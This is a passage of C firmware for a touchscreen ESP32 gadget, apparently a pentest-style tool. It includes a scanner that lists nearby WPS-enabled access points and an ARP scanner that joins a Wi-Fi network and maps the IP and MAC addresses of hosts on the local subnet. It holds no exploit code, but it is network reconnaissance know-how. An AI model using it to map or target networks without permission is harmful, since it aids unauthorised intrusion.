      if (esp_wifi_scan_get_ap_records(&apNum, rec) == ESP_OK) {
        for (uint16_t i = 0;
             i < apNum && WpsScanner_s_count < WpsScanner_MAX_WPS_APS; i++) {
          if (!rec[i].wps) {
            continue;
          }
          __auto_type e = &(WpsScanner_s_aps[WpsScanner_s_count]);
          WpsScanner_truncCopy((*e).ssid, sizeof((*e).ssid),
                               (const char*)rec[i].ssid, 32);
          memcpy((*e).bssid, rec[i].bssid, 6);
          (*e).rssi = rec[i].rssi;
          (*e).channel = rec[i].primary;
          (*e).authmode = rec[i].authmode;
          WpsScanner_s_count++;
        }
      }
      free(rec);
    }
  }

  if (WpsScanner_s_count > 1) {
    qsort(WpsScanner_s_aps, WpsScanner_s_count, sizeof(WpsScanner_WpsAp),
          WpsScanner_compareWpsAp);
  }

  network_clear_scan();
  WpsScanner_s_scanning = false;
  WpsScanner_s_lastRenderedPage = -1;
  WpsScanner_drawScanScreen(true);
  WpsScanner_updateNavLabels();
}

static void WpsScanner_handleNavButtons(void) {
  const unsigned long now = sys_monotonic_ms();
  if (now - WpsScanner_s_lastBtnMs < WpsScanner_BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  if (isButtonPressedEdge(BTN_LEFT)) {
    WpsScanner_runScan();
    WpsScanner_s_lastBtnMs = now;
    return;
  }

  const int perPage = WpsScanner_networksPerPage();
  if (isButtonPressedEdge(BTN_DOWN)) {
    if (WpsScanner_s_count > 0) {
      WpsScanner_s_currentIndex =
          (WpsScanner_s_currentIndex + 1) % WpsScanner_s_count;
      WpsScanner_drawScanScreen(false);
    }
    WpsScanner_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    if (WpsScanner_s_count > 0) {
      WpsScanner_s_currentIndex =
          (WpsScanner_s_currentIndex - 1 + WpsScanner_s_count) %
          WpsScanner_s_count;
      WpsScanner_drawScanScreen(false);
    }
    WpsScanner_s_lastBtnMs = now;
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (WpsScanner_s_count > perPage) {
      const int pages = (WpsScanner_s_count + perPage - 1) / perPage;
      WpsScanner_s_currentPage = (WpsScanner_s_currentPage + 1) % pages;
      WpsScanner_s_currentIndex = WpsScanner_s_currentPage * perPage;
      WpsScanner_drawScanScreen(true);
    }
    WpsScanner_s_lastBtnMs = now;
    return;
  }
}

static void WpsScanner_handleTouch(void) {
  int x, y;
  if (!feature_active || !readTouchXY(&(x), &(y))) {
    return;
  }

  const int perPage = WpsScanner_networksPerPage();
  if (y >= WpsScanner_LIST_FIRST_ROW_Y && y < wifiListBottomY() &&
      WpsScanner_s_count > 0) {
    const int row = (y - WpsScanner_LIST_FIRST_ROW_Y) / WpsScanner_LIST_ROW_H;
    const int idx = WpsScanner_s_currentPage * perPage + row;
    if (row >= 0 && row < perPage && idx < WpsScanner_s_count) {
      WpsScanner_s_currentIndex = idx;
      WpsScanner_drawScanScreen(false);
      sys_sleep_ms(120);
    }
  }
}

static void WpsScanner_runUI(void) {
  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_undo,
                                                 bitmap_icon_go_back};

  if (!WpsScanner_s_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    WpsScanner_s_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  switch (animationState) {
    case 0:
      break;
    case 1:
      if (sys_monotonic_ms() - lastAnimationTime >= 150) {
        display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                            ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 2:
      if (sys_monotonic_ms() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = sys_monotonic_ms();
      }
      break;
    case 3:
      if (activeIcon == 0) {
        WpsScanner_runScan();
      }
      animationState = 0;
      activeIcon = -1;
      break;
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void WpsScanner_teardown(void) {
  network_clear_scan();
  network_disconnect_options(true, true);
  WpsScanner_s_scanning = false;
}

void WpsScanner_wpsScannerSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  WpsScanner_s_uiDrawn = false;
  WpsScanner_s_count = 0;
  WpsScanner_s_currentIndex = 0;
  WpsScanner_s_currentPage = 0;
  WpsScanner_s_scanning = false;
  WpsScanner_s_lastRenderedIndex = -1;
  WpsScanner_s_lastRenderedPage = -1;

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();
  WpsScanner_runUI();
  WpsScanner_updateNavLabels();

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  WpsScanner_runScan();
}

void WpsScanner_wpsScannerLoop(void) {
  if (feature_exit_requested) {
    WpsScanner_teardown();
    return;
  }
  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    WpsScanner_teardown();
    feature_exit_requested = true;
    return;
  }

  WpsScanner_handleNavButtons();
  WpsScanner_handleTouch();
  updateStatusBar();
  WpsScanner_runUI();
  maintainTouchNavBar();

  if (feature_exit_requested) {
    WpsScanner_teardown();
  }
}

#undef SCREEN_WIDTH
#define SCREEN_WIDTH 240
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#undef STATUS_BAR_HEIGHT
#define STATUS_BAR_HEIGHT 16
#undef ICON_SIZE
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 2

enum { ArpScanner_LIST_HEADER_Y = 50 };
enum { ArpScanner_LIST_FIRST_ROW_Y = ArpScanner_LIST_HEADER_Y + 20 };
enum { ArpScanner_LIST_ROW_H = 22 };
enum { ArpScanner_MAX_APS = 40 };
enum { ArpScanner_MAX_HOSTS = 64 };
static const unsigned long ArpScanner_BTN_DEBOUNCE_MS = 200;
enum { ArpScanner_CONNECT_TIMEOUT_MS = 15000 };
enum { ArpScanner_ARP_BATCH = 8 };
enum { ArpScanner_ARP_BATCH_WAIT_MS = 80 };
enum { ArpScanner_ARP_MAX_HOSTS_SWEEP = 254 };

typedef uint8_t ArpScanner_Phase;
enum { ArpScanner_Phase_ApList = 0, ArpScanner_Phase_Hosts };

typedef struct ArpScanner_ApEntry {
  char ssid[33];
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  wifi_auth_mode_t authmode;
} ArpScanner_ApEntry;
#define ArpScanner_ApEntry_INITIALIZER {0}
;

typedef struct ArpScanner_HostEntry {
  uint32_t ip;  // same packing as IPAddress uint32_t
  uint8_t mac[6];
} ArpScanner_HostEntry;
#define ArpScanner_HostEntry_INITIALIZER {0}
;

static ArpScanner_ApEntry ArpScanner_s_aps[ArpScanner_MAX_APS];
static int ArpScanner_s_apCount = 0;
static ArpScanner_HostEntry ArpScanner_s_hosts[ArpScanner_MAX_HOSTS];
static int ArpScanner_s_hostCount = 0;

static ArpScanner_Phase ArpScanner_s_phase = ArpScanner_Phase_ApList;
static int ArpScanner_s_currentIndex = 0;
static int ArpScanner_s_currentPage = 0;
static bool ArpScanner_s_scanning = false;
static bool ArpScanner_s_uiDrawn = false;
static unsigned long ArpScanner_s_lastBtnMs = 0;
static int ArpScanner_s_lastRenderedIndex = -1;
static int ArpScanner_s_lastRenderedPage = -1;
static char ArpScanner_s_joinedSsid[33] = {0};

static void ArpScanner_drawScreen(bool fullRedraw);
static void ArpScanner_updateNavLabels(void);
static void ArpScanner_scanAccessPoints(void);
static void ArpScanner_joinSelectedAp(void);
static void ArpScanner_runArpSweep(void);
static void ArpScanner_disconnectSta(void);

static int ArpScanner_networksPerPage(void) {
  return DIV_MAX(1, (wifiListBottomY() - ArpScanner_LIST_FIRST_ROW_Y) /
                        ArpScanner_LIST_ROW_H);
}

static void ArpScanner_updateNavLabels(void) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (ArpScanner_s_phase == ArpScanner_Phase_ApList) {
    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Join");
  } else {
    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Back");
  }
  redrawTouchButtonBar();
}

static void ArpScanner_drawButton(int x, int y, int w, int h, const char* label,
                                  bool highlight, bool disabled) {
  FeatureUI_ButtonStyle style = highlight ? FeatureUI_ButtonStyle_Primary
                                          : FeatureUI_ButtonStyle_Secondary;
  FeatureUI_drawButtonRect(x, y, w, h, label, style, false, disabled, 1);
}

static void ArpScanner_drawTabBar(const char* leftButton, bool leftDisabled,
                                  const char* prevButton, bool prevDisabled,
                                  const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    ArpScanner_updateNavLabels();
    return;
  }
  display_fill_rect(&(tft), 0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) {
    ArpScanner_drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  }
  if (prevButton && prevButton[0]) {
    ArpScanner_drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    ArpScanner_drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
  }
}

static int ArpScanner_compareApRssi(const void* a, const void* b) {
  const ArpScanner_ApEntry* ap1 = (const ArpScanner_ApEntry*)a;
  const ArpScanner_ApEntry* ap2 = (const ArpScanner_ApEntry*)b;
  return (int)ap2->rssi - (int)ap1->rssi;
}

static int ArpScanner_compareHostIp(const void* a, const void* b) {
  const ArpScanner_HostEntry* h1 = (const ArpScanner_HostEntry*)a;
  const ArpScanner_HostEntry* h2 = (const ArpScanner_HostEntry*)b;
  if (h1->ip < h2->ip) return -1;
  if (h1->ip > h2->ip) return 1;
  return 0;
}

static const char* ArpScanner_authShort(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA*";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "ENT";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:
      return "WPA3*";
    default:
      return "?";
  }
}

static void ArpScanner_truncCopy(char* dst, size_t dstSz, const char* src,
                                 size_t maxChars) {
  if (!dst || dstSz == 0) {
    return;
  }
  if (!src) {
    dst[0] = '\0';
    return;
  }
  size_t n = strlen(src);
  if (n > maxChars) {
    n = maxChars;
  }
  if (n >= dstSz) {
    n = dstSz - 1;
  }
  memcpy(dst, src, n);
  dst[n] = '\0';
}

static struct netif* ArpScanner_staNetif(void) {
  if (netif_default && netif_is_up(netif_default) &&
      !ip4_addr_isany_val(*netif_ip4_addr(netif_default))) {
    return netif_default;
  }
  for (struct netif* n = netif_list; n != NULL; n = n->next) {
    if (netif_is_up(n) && !ip4_addr_isany_val(*netif_ip4_addr(n))) {
      return n;
    }
  }
  return netif_default;
}

static void ArpScanner_displayBusy(const char* line1, const char* line2) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  ArpScanner_s_lastRenderedIndex = -1;
  ArpScanner_s_lastRenderedPage = -1;
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), GREEN, TFT_BLACK);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), (TEXT(line1)).data);
  if (line2 && line2[0]) {
    display_set_text_color_2(&(tft), GREEN, TFT_BLACK);
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), (TEXT(line2)).data);
  }
}

static void ArpScanner_displayBusyWithLoading(const char* line1,
                                              const char* line2) {
  ArpScanner_displayBusy(line1, line2);
  loading(100, ORANGE, 0, 0, 3, true);
  // Restore the status lines after the centered loading bitmap.
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), GREEN, TFT_BLACK);
  display_set_cursor(&(tft), 10, 50);
  display_print_line_cstr(&(tft), (TEXT(line1)).data);
  if (line2 && line2[0]) {
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), (TEXT(line2)).data);
  }
}

enum { ArpScanner_COL_LEFT_X = 10 };
enum { ArpScanner_COL_RIGHT_MARGIN = 4 };

static void ArpScanner_drawApRow(int i, int y, bool isSel) {
  char name[16];
  if (ArpScanner_s_aps[i].ssid[0]) {
    ArpScanner_truncCopy(name, sizeof(name), ArpScanner_s_aps[i].ssid, 11);
    if (strlen(ArpScanner_s_aps[i].ssid) > 11) {
      strcat(name, "...");
    }
  } else {
    snprintf(name, sizeof(name), "(hidden)");
  }

  char left[48];
  snprintf(left, sizeof(left), "%02d: %s", i + 1, name);

  char right[28];
  snprintf(right, sizeof(right), "%d  Ch%u  %s", (int)ArpScanner_s_aps[i].rssi,
           (unsigned)ArpScanner_s_aps[i].channel,
           ArpScanner_authShort(ArpScanner_s_aps[i].authmode));

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, ArpScanner_LIST_ROW_H,
                    TFT_BLACK);
  display_set_cursor(&(tft), 2, y);
  display_set_text_color_2(&(tft), isSel ? ORANGE : FEATURE_BG, TFT_BLACK);
  display_print(&(tft), (TEXT(isSel ? ">" : " ")).data);

  const bool openNet = (ArpScanner_s_aps[i].authmode == WIFI_AUTH_OPEN);
  const uint16_t fg = isSel ? ORANGE : (openNet ? ORANGE : WHITE);
  const int rightW = display_text_width(&(tft), right, 0);
  const int rightX = SCREEN_WIDTH - ArpScanner_COL_RIGHT_MARGIN - rightW;

  display_set_text_color_2(&(tft), fg, TFT_BLACK);
  display_set_cursor(&(tft), ArpScanner_COL_LEFT_X, y);
  display_print(&(tft), (TEXT(left)).data);

  display_set_cursor(&(tft), rightX, y);
  display_print(&(tft), (TEXT(right)).data);
}

static void ArpScanner_drawHostRow(int i, int y, bool isSel) {
  char left[48];
  uint32_t ip = ArpScanner_s_hosts[i].ip;
  snprintf(left, sizeof(left), "%02d: %d.%d.%d.%d", i + 1,
           (int)((ip >> 0) & 255), (int)((ip >> 8) & 255),
           (int)((ip >> 16) & 255), (int)((ip >> 24) & 255));

  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           ArpScanner_s_hosts[i].mac[0], ArpScanner_s_hosts[i].mac[1],
           ArpScanner_s_hosts[i].mac[2], ArpScanner_s_hosts[i].mac[3],
           ArpScanner_s_hosts[i].mac[4], ArpScanner_s_hosts[i].mac[5]);

  display_fill_rect(&(tft), 0, y, SCREEN_WIDTH, ArpScanner_LIST_ROW_H,
                    TFT_BLACK);
  display_set_cursor(&(tft), 2, y);
  display_set_text_color_2(&(tft), isSel ? ORANGE : FEATURE_BG, TFT_BLACK);
  display_print(&(tft), (TEXT(isSel ? ">" : " ")).data);

  const int macW = display_text_width(&(tft), mac, 0);
  const int macX = SCREEN_WIDTH - ArpScanner_COL_RIGHT_MARGIN - macW;

  display_set_text_color_2(&(tft), isSel ? ORANGE : WHITE, TFT_BLACK);
  display_set_cursor(&(tft), ArpScanner_COL_LEFT_X, y);
  display_print(&(tft), (TEXT(left)).data);

  display_set_text_color_2(&(tft), isSel ? ORANGE : UI_DIM_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), macX, y);
  display_print(&(tft), (TEXT(mac)).data);
}

static void ArpScanner_drawListCommon(bool fullRedraw, int count,
                                      const char* header,
                                      void (*drawRow)(int, int, bool)) {
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  display_set_text_size(&(tft), 1);

  if (ArpScanner_s_scanning) {
    return;
  }

  if (count == 0) {
    wifiClearBody(TFT_BLACK);
    ArpScanner_s_lastRenderedIndex = -1;
    ArpScanner_s_lastRenderedPage = -1;
    display_set_text_color_1(&(tft), GREEN);
    display_set_cursor(&(tft), 10, 50);
    if (ArpScanner_s_phase == ArpScanner_Phase_ApList) {
      display_print_line_cstr(&(tft), "No networks found.");
    } else {
      display_print_line_cstr(&(tft), "No hosts found.");
    }
    display_set_cursor(&(tft), 10, 65);
    display_print_line_cstr(&(tft), "Press Rescan.");
    ArpScanner_drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int perPage = ArpScanner_networksPerPage();
  if (ArpScanner_s_currentIndex < 0) {
    ArpScanner_s_currentIndex = 0;
  }
  if (ArpScanner_s_currentIndex >= count) {
    ArpScanner_s_currentIndex = DIV_MAX(0, count - 1);
  }
  ArpScanner_s_currentPage = ArpScanner_s_currentIndex / DIV_MAX(1, perPage);

  const bool pageChanged =
      (ArpScanner_s_currentPage != ArpScanner_s_lastRenderedPage);
  const bool needFull =
      fullRedraw || pageChanged || (ArpScanner_s_lastRenderedIndex < 0);

  if (!needFull &&
      ArpScanner_s_lastRenderedIndex != ArpScanner_s_currentIndex) {
    const int prev = ArpScanner_s_lastRenderedIndex;
    const int now = ArpScanner_s_currentIndex;
    const int start = ArpScanner_s_currentPage * perPage;
    if (prev >= start && prev < start + perPage) {
      drawRow(
          prev,
          ArpScanner_LIST_FIRST_ROW_Y + (prev - start) * ArpScanner_LIST_ROW_H,
          false);
    }
    if (now >= start && now < start + perPage) {
      drawRow(
          now,
          ArpScanner_LIST_FIRST_ROW_Y + (now - start) * ArpScanner_LIST_ROW_H,
          true);
    }
    ArpScanner_s_lastRenderedIndex = ArpScanner_s_currentIndex;
    return;
  }

  if (!needFull) {
    return;
  }

  wifiClearBody(TFT_BLACK);

  display_set_text_color_1(&(tft), GREEN);
  display_set_cursor(&(tft), 10, ArpScanner_LIST_HEADER_Y);
  display_print_line_cstr(&(tft), (TEXT(header)).data);

  char page_buf[32];
  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
           ArpScanner_s_currentPage + 1,
           DIV_MAX(1, (count + perPage - 1) / perPage));
  display_set_cursor(&(tft), 180, ArpScanner_LIST_HEADER_Y);
  display_set_text_color_1(&(tft), GREEN);
  display_print_line_cstr(&(tft), (TEXT(page_buf)).data);

  int y = ArpScanner_LIST_FIRST_ROW_Y;
  const int start_index = ArpScanner_s_currentPage * perPage;
  const int end_index = DIV_MIN(start_index + perPage, count);
  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
    drawRow(i, y, i == ArpScanner_s_currentIndex);
    y += ArpScanner_LIST_ROW_H;
  }

  ArpScanner_drawTabBar("Rescan", false, "Prev", ArpScanner_s_currentIndex <= 0,
                        "Next", ArpScanner_s_currentIndex >= count - 1);
  ArpScanner_s_lastRenderedIndex = ArpScanner_s_currentIndex;
  ArpScanner_s_lastRenderedPage = ArpScanner_s_currentPage;
}

static void ArpScanner_drawScreen(bool fullRedraw) {
  if (ArpScanner_s_phase == ArpScanner_Phase_ApList) {
    ArpScanner_drawListCommon(fullRedraw, ArpScanner_s_apCount,
                              "Join Network:", ArpScanner_drawApRow);
  } else {
    ArpScanner_drawListCommon(fullRedraw, ArpScanner_s_hostCount,
                              "ARP Hosts:", ArpScanner_drawHostRow);
  }
  ArpScanner_updateNavLabels();
}

static void ArpScanner_scanAccessPoints(void) {
  ArpScanner_s_scanning = true;
  ArpScanner_s_phase = ArpScanner_Phase_ApList;
  ArpScanner_s_apCount = 0;
  ArpScanner_s_currentIndex = 0;
  ArpScanner_s_currentPage = 0;
  ArpScanner_s_lastRenderedPage = -1;
  ArpScanner_displayBusyWithLoading("Scanning.", "Looking for networks.");
  ArpScanner_updateNavLabels();

  ArpScanner_disconnectSta();
  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(true, true);
  sys_sleep_ms(40);
  network_clear_scan();

  const uint32_t dwell = wifiStaScanMsPerChannel();
  const int n = network_scan(false, true, false, dwell);
  if (n > 0) {
    for (int i = 0; i < n && ArpScanner_s_apCount < ArpScanner_MAX_APS; i++) {
      __auto_type e = &(ArpScanner_s_aps[ArpScanner_s_apCount]);
      ArpScanner_truncCopy((*e).ssid, sizeof((*e).ssid), (network_ssid(i)).data,
                           32);
      const uint8_t* bssid = network_bssid(i);
      if (bssid) {
        memcpy((*e).bssid, bssid, 6);
      } else {
        memset((*e).bssid, 0, 6);
      }
      (*e).rssi = (int8_t)network_rssi(i);
      (*e).channel = (uint8_t)network_channel(i);
      (*e).authmode = network_auth_mode(i);
      ArpScanner_s_apCount++;
    }
  }

  if (ArpScanner_s_apCount > 1) {
    qsort(ArpScanner_s_aps, ArpScanner_s_apCount, sizeof(ArpScanner_ApEntry),
          ArpScanner_compareApRssi);
  }

  network_clear_scan();
  ArpScanner_s_scanning = false;
  ArpScanner_s_lastRenderedPage = -1;
  ArpScanner_drawScreen(true);
}

static bool ArpScanner_promptPassword(text_t* outPass) {
  OnScreenKeyboardConfig cfg = OnScreenKeyboardConfig_INITIALIZER;
  cfg.titleLine1 = "[!] WiFi password";
  cfg.titleLine2 = "Required to join AP for ARP scan";
  osKeyboardUseStandardLayout(&(cfg));
  cfg.maxLen = 63;
  cfg.shuffleNames = NULL;
  cfg.shuffleCount = 0;
  cfg.buttonsY = 195;
  cfg.backLabel = "Back";
  cfg.middleLabel = NULL;
  cfg.okLabel = "Join";
  cfg.enableShuffle = false;
  cfg.requireNonEmpty = true;
  cfg.emptyErrorMsg = "Password required!";

  OnScreenKeyboardResult r = showOnScreenKeyboard(&(cfg), TEXT(""));
  resetTouchNavHeldState();
  ArpScanner_s_uiDrawn = false;

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();

  if (!r.accepted || strlen((r.text).data) == 0) {
    return false;
  }
  (*outPass) = r.text;
  return true;
}

static bool ArpScanner_connectToAp(const ArpScanner_ApEntry* ap,
                                   const char* password) {
  ArpScanner_displayBusyWithLoading("Connecting.",
                                    (*ap).ssid[0] ? (*ap).ssid : "(hidden)");

  network_set_mode(WIFI_MODE_STA);
  network_disconnect_options(true, true);
  sys_sleep_ms(40);

  if ((*ap).authmode == WIFI_AUTH_OPEN || !password || !password[0]) {
    network_connect_config((*ap).ssid, NULL, (*ap).channel, (*ap).bssid);
  } else {
    network_connect_config((*ap).ssid, password, (*ap).channel, (*ap).bssid);
  }

  const uint32_t start = sys_monotonic_ms();
  while (network_connected() != true) {
    if (feature_exit_requested || isButtonPressed(BTN_SELECT) ||
        featureExitButtonPressed()) {
      network_disconnect_options(true, true);
      return false;
    }
    if (sys_monotonic_ms() - start > ArpScanner_CONNECT_TIMEOUT_MS) {
      network_disconnect_options(true, true);
      return false;
    }
    sys_sleep_ms(50);
    updateStatusBar();
  }
  ArpScanner_truncCopy(ArpScanner_s_joinedSsid, sizeof(ArpScanner_s_joinedSsid),
                       (*ap).ssid, 32);
  return true;
}

static void ArpScanner_disconnectSta(void) {
  if (network_get_mode() != WIFI_MODE_NULL) {
    network_disconnect_options(true, true);
  }
  ArpScanner_s_joinedSsid[0] = '\0';
}

static bool ArpScanner_hostAlreadyStored(uint32_t ip) {
  for (int i = 0; i < ArpScanner_s_hostCount; i++) {
    if (ArpScanner_s_hosts[i].ip == ip) {
      return true;
    }
  }
  return false;
}

static void ArpScanner_tryStoreHost(uint32_t ipU32, const uint8_t mac[6]) {
  if (ArpScanner_s_hostCount >= ArpScanner_MAX_HOSTS ||
      ArpScanner_hostAlreadyStored(ipU32)) {
    return;
  }
  __auto_type h = &(ArpScanner_s_hosts[ArpScanner_s_hostCount]);
  (*h).ip = ipU32;
  memcpy((*h).mac, mac, 6);
  ArpScanner_s_hostCount++;
}

static void arp_paint_progress(int* previous) {
  if (ArpScanner_s_hostCount == *previous) return;
  *previous = ArpScanner_s_hostCount;
  char text[32];
  snprintf(text, sizeof(text), "Found %-3d hosts   ", *previous);
  display_set_text_size(&tft, 1);
  display_set_text_color_2(&tft, UI_DIM_TEXT, TFT_BLACK);
  display_set_cursor(&tft, 10, 80);
  display_print(&tft, text);
}
static void ArpScanner_runArpSweep(void) {
  ArpScanner_s_scanning = true;
  ArpScanner_s_phase = ArpScanner_Phase_Hosts;
  ArpScanner_s_hostCount = 0;
  ArpScanner_s_currentIndex = 0;
  ArpScanner_s_currentPage = 0;
  ArpScanner_s_lastRenderedPage = -1;

  if (network_connected() != true) {
    ArpScanner_s_scanning = false;
    ArpScanner_displayBusy("Not connected.", "Join a network first.");
    sys_sleep_ms(700);
    ArpScanner_s_phase = ArpScanner_Phase_ApList;
    ArpScanner_drawScreen(true);
    return;
  }

  ArpScanner_displayBusy("ARP Scanning.", "Probing local subnet.");
  ArpScanner_updateNavLabels();

  // Stable progress line under the status text (no wipe / no status-bar churn).
  int lastProgHosts = -1;

  arp_paint_progress(&lastProgHosts);

  struct netif* nif = ArpScanner_staNetif();
  if (!nif) {
    ArpScanner_s_scanning = false;
    ArpScanner_displayBusy("ARP failed.", "No network interface.");
    sys_sleep_ms(700);
    ArpScanner_drawScreen(true);
    return;
  }

  const uint32_t localIp = (uint32_t)network_ipv4(false);
  const uint32_t mask = (uint32_t)network_netmask();
  const uint32_t network = localIp & mask;
  const uint32_t broadcast = network | (~mask);

  uint32_t startHost = network + 1;
  uint32_t endHost = (broadcast > startHost) ? (broadcast - 1) : startHost;
  if (endHost < startHost) {
    endHost = startHost;
  }

  // Cap sweep size for UI responsiveness on large subnets.
  uint32_t total = endHost - startHost + 1;
  if (total > (uint32_t)ArpScanner_ARP_MAX_HOSTS_SWEEP) {
    const uint32_t base = localIp & 0xFFFFFF00u;
    startHost = base + 1;
    endHost = base + 254;
    if (startHost < network + 1) startHost = network + 1;
    if (endHost > broadcast - 1) endHost = broadcast - 1;
  }

  // Always include gateway if present.
  const uint32_t gw = (uint32_t)network_gateway();
  if (gw != 0 && gw != localIp) {
    ip4_addr_t target;
    target.addr = gw;
    etharp_request(nif, &target);
    sys_sleep_ms(ArpScanner_ARP_BATCH_WAIT_MS);
    struct eth_addr* eth = NULL;
    const ip4_addr_t* tip = NULL;
    if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
      ArpScanner_tryStoreHost(gw, eth->addr);
      arp_paint_progress(&lastProgHosts);
    }
  }

  uint32_t batchIps[ArpScanner_ARP_BATCH];
  int batchCount = 0;
  uint8_t statusTick = 0;

  for (uint32_t host = startHost; host <= endHost; host++) {
    if (feature_exit_requested) {
      break;
    }
    if (host == localIp || host == broadcast || host == network) {
      continue;
    }
    batchIps[batchCount++] = host;
    if (batchCount >= ArpScanner_ARP_BATCH) {
      for (int i = 0; i < batchCount; i++) {
        ip4_addr_t target;
        target.addr = batchIps[i];
        etharp_request(nif, &target);
      }
      sys_sleep_ms(ArpScanner_ARP_BATCH_WAIT_MS);
      for (int i = 0; i < batchCount; i++) {
        ip4_addr_t target;
        target.addr = batchIps[i];
        struct eth_addr* eth = NULL;
        const ip4_addr_t* tip = NULL;
        if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
          ArpScanner_tryStoreHost(batchIps[i], eth->addr);
        }
      }
      batchCount = 0;
      arp_paint_progress(&lastProgHosts);
      if ((++statusTick & 0x07) == 0) {
        updateStatusBar();
      }
    }
  }

  if (batchCount > 0) {
    for (int i = 0; i < batchCount; i++) {
      ip4_addr_t target;
      target.addr = batchIps[i];
      etharp_request(nif, &target);
    }
    sys_sleep_ms(ArpScanner_ARP_BATCH_WAIT_MS);
    for (int i = 0; i < batchCount; i++) {
      ip4_addr_t target;
      target.addr = batchIps[i];
      struct eth_addr* eth = NULL;
      const ip4_addr_t* tip = NULL;
      if (etharp_find_addr(nif, &target, &eth, &tip) >= 0 && eth) {
        ArpScanner_tryStoreHost(batchIps[i], eth->addr);
      }
    }
    arp_paint_progress(&lastProgHosts);
  }

  // Also record ourselves.
  {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    ArpScanner_tryStoreHost(localIp, mac);
  }

  if (ArpScanner_s_hostCount > 1) {
    qsort(ArpScanner_s_hosts, ArpScanner_s_hostCount,
          sizeof(ArpScanner_HostEntry), ArpScanner_compareHostIp);
  }

  ArpScanner_s_scanning = false;
  ArpScanner_s_lastRenderedPage = -1;
  ArpScanner_drawScreen(true);
}

static void ArpScanner_joinSelectedAp(void) {
  if (ArpScanner_s_phase != ArpScanner_Phase_ApList ||
